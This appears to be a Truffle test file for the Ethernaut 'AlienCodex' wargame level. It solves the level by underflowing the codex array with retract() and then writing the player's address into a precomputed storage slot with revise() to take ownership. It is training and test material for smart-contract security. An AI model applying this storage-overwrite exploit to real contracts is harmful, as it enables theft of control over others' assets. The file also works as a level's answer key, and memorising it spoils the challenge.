const AlienCodex = artifacts.require('./levels/AlienCodex.sol')
const AlienCodexFactory = artifacts.require('./levels/AlienCodexFactory.sol')

const Ethernaut = artifacts.require('./Ethernaut.sol')
const utils = require('../utils/TestUtils')


contract('AlienCodex', function(accounts) {

  let ethernaut
  let level
  let instance
  let owner = accounts[1]
  let player = accounts[0]

  before(async function() {
    ethernaut = await Ethernaut.new();
    level = await AlienCodexFactory.new()
    await ethernaut.registerLevel(level.address)
    instance = await utils.createLevelInstance(
      ethernaut, level.address, player, AlienCodex,
      {from: player}
    )
  });

  describe('instance', function() {

    it('should not be immediately solvable', async function() {
      // Player is not owner yet
      assert.notEqual(player, owner);

      // Player hasn't made first contact yet
      let status = await instance.contact.call();
      assert.isFalse(status);
    });

    it('should allow the user to join AlienCodex', async function() {
      
      await instance.make_contact();
      
      // Player should have successfully made first contact
      let status = await instance.contact.call();
      assert.isTrue(status);
    });

    it('codex array should underflow, giving user all storage access to become owner', async function() {
      
      await instance.retract();

      const owner_loc = '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'; // location of owner ptr, offset by array's frame of reference
      const padding = '0x000000000000000000000000';
      let _data = padding + player.substr(2);

      await instance.revise(owner_loc, _data, {from:player});

      // Player should own the instance now
      let ownr = await instance.owner();
      assert.equal(ownr, player);
    });
  });
});